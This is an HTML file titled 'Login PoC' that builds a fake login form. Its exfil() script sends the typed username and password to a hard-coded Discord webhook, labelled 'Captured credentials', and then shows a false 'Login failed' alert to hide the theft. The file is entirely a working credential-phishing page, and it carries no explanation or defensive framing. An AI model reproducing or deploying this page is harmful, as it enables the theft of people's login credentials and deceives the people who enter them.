<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login PoC</title>
  <style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 50px; }
    .login-box {
      background: white; padding: 20px; max-width: 300px; margin: auto;
      border-radius: 6px; box-shadow: 0 0 10px #ccc;
    }
    input, button {
      width: 100%; margin-top: 10px; padding: 10px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="exfil()">Login</button>
  </div>

  <script>
    function exfil() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Send to Discord webhook
      fetch('https://discord.com/api/webhooks/1443347424805523506/wD-wkxSLEYKVcc2KXImsqDidIPCfZdkiKHrNuitA-T8rmBIwTfuSf5KukdB39RHJ1-7X', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: `🛑 **Captured credentials**\nUsername: \`${username}\`\nPassword: \`${password}\``
        })
      });

      // Optional fake success message
      alert("Login failed. Please try again later.");
    }
  </script>
</body>
</html>
